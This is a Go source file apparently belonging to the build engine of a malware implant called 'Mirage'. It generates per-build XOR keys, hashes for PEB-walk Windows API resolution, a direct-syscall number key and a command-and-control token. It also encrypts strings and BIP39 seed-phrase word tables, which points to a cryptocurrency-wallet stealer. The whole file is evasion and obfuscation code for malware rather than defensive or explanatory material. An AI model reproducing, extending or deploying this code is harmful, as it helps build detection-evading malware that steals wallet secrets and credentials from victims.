// Package builder — Mirage polymorphic build engine
//
// Replaces tools/make_polymorphic.py with Go-native per-build crypto.
// Generates unique XOR keys, DJB2-style hashes for PEB-walk API
// resolution, and encrypted string/BIP39 tables.
package builder

import (
	"crypto/rand"
	"encoding/binary"
	"math/bits"
	"unicode"
)

// PolyConfig holds per-build cryptographic constants.
type PolyConfig struct {
	Seed      uint32
	StringKey [16]byte
	SSNXorKey uint32
	C2Token   string
}

// ── Core crypto ────────────────────────────────────────────────

func rotl32(v uint32, n uint32) uint32 {
	return bits.RotateLeft32(v, int(n))
}


// genSeed returns a random non-zero uint32.
func genSeed() (uint32, error) {
	var buf [4]byte
	if _, err := rand.Read(buf[:]); err != nil {
		return 0, err
	}
	return binary.LittleEndian.Uint32(buf[:]), nil
}

// GeneratePoly creates a new PolyConfig with random seed and key.
func GeneratePoly(seed uint32) (PolyConfig, error) {
	if seed == 0 {
		var err error
		seed, err = genSeed()
		if err != nil {
			return PolyConfig{}, err
		}
	}
	// Derive key deterministically from seed (matching Python make_polymorphic.py behavior)
	var key [16]byte
	deriveKeyFromSeed(seed, &key)
	ssnKey := seed ^ binary.LittleEndian.Uint32(key[:4])
	// Token also derived from seed for deterministic mode
	token := deriveToken(seed)
	return PolyConfig{
		Seed:      seed,
		StringKey: key,
		SSNXorKey: ssnKey,
		C2Token:   token,
	}, nil
}

// deriveKeyFromSeed generates a deterministic 16-byte key from a seed.
func deriveKeyFromSeed(seed uint32, out *[16]byte) {
	for i := uint32(0); i < 16; i++ {
		h := hashBytes([]byte{byte(i), byte(seed), byte(seed >> 8), byte(seed >> 16), byte(seed >> 24)}, seed, 3)
		out[i] = byte(h ^ (h >> 8) ^ (h >> 16) ^ (h >> 24))
	}
}

// deriveToken generates a deterministic 32-char hex token from a seed.
func deriveToken(seed uint32) string {
	const hexCh = "0123456789abcdef"
	tok := make([]byte, 32)
	for i := 0; i < 32; i++ {
		h := hashBytes([]byte{byte(i), byte(seed), byte(seed >> 8)}, seed, 4)
		tok[i] = hexCh[h&0xF]
	}
	return string(tok)
}

// ── Hashing ────────────────────────────────────────────────────

func hashBytes(data []byte, seed uint32, iterations uint32) uint32 {
	h := seed
	for _, b := range data {
		for range iterations {
			h = rotl32(h, 5)
			h ^= uint32(b)
			h = h*0x1B873593 + 0x85EBCA6B
		}
	}
	return h
}

// ComputeModuleHash — 28 iterations, case-insensitive, XOR'd with StringKey.
func (pc PolyConfig) ComputeModuleHash(dllName string) uint32 {
	enc := make([]byte, len(dllName))
	for i := 0; i < len(dllName); i++ {
		b := dllName[i] ^ pc.StringKey[i%16]
		if b >= 'A' && b <= 'Z' {
			b += 32
		}
		enc[i] = b
	}
	return hashBytes(enc, pc.Seed, 28)
}

// ComputeFuncHash — 27 iterations, exact case, XOR'd with StringKey.
func (pc PolyConfig) ComputeFuncHash(funcName string) uint32 {
	enc := make([]byte, len(funcName))
	for i := 0; i < len(funcName); i++ {
		enc[i] = funcName[i] ^ pc.StringKey[i%16]
	}
	return hashBytes(enc, pc.Seed, 27)
}

// ── String encryption ──────────────────────────────────────────

// EncryptString XOR-encrypts a string with the StringKey.
func (pc PolyConfig) EncryptString(plain string) []byte {
	out := make([]byte, len(plain))
	for i := 0; i < len(plain); i++ {
		out[i] = plain[i] ^ pc.StringKey[i%16]
	}
	return out
}

// EncryptBIP39Word encrypts a single BIP39 mnemonic word.
func (pc PolyConfig) EncryptBIP39Word(word string) []byte {
	return pc.EncryptString(word)
}

// ── Validation ─────────────────────────────────────────────────

func (pc PolyConfig) Validate() error {
	if pc.Seed == 0 {
		return polyError{field: "Seed"}
	}
	var zero [16]byte
	if pc.StringKey == zero {
		return polyError{field: "StringKey"}
	}
	if pc.C2Token == "" {
		return polyError{field: "C2Token"}
	}
	return nil
}

type polyError struct{ field string }

func (e polyError) Error() string { return "poly: zero " + e.field }

// IsPrintableASCII returns true if all bytes are printable ASCII.
func IsPrintableASCII(s string) bool {
	for _, r := range s {
		if r > unicode.MaxASCII || !unicode.IsPrint(r) {
			return false
		}
	}
	return true
}
